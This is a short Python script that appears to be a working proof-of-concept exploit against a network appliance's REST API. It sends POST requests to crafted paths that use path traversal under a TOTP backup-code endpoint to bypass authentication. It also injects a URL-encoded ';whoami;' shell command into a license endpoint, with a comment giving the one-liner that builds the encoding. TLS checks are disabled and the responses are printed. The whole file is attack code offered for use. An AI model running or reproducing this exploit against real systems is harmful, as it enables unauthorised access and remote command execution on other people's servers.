import requests
import sys
import urllib3
urllib3.disable_warnings()

base_url = sys.argv[1]
path_list = ["/api/v1/totp/user-backup-code/../../system/system-information",
"/api/v1/totp/user-backup-code/%2E%2E/%2E%2E/system/maintenance/archiving/cloud-server-test-connection",
#$(echo ";whoami;" | xxd -p|tr -d \\n|sed 's/../%&/g')
"/api/v1/totp/user-backup-code/../../license/keys-status/%3b%77%68%6f%61%6d%69%3b%0a",
"/api/v1/configuration/users/user-roles/user-role/rest-userrole1/web/web-bookmarks/bookmark"]

data = {"type": f";d;"}
for path in path_list:
    url = f"{base_url}{path}"
    print(url)
    try:
        response = requests.post(url, json=data, verify=False, timeout=10)
        print("HEADERS ==================================================================================")
        print(response.headers)
        print("CODE =====================================================================================")
        print(response.status_code)
        print("HTML =====================================================================================")
        if "L'accès au site Web est bloqué par votre administrateur." in response.text:
            print("L'accès au site Web est bloqué par votre administrateur.")
        else:
            print(response.text)
        print("==========================================================================================\n\n")
    except:
        print("serveur injoignable.")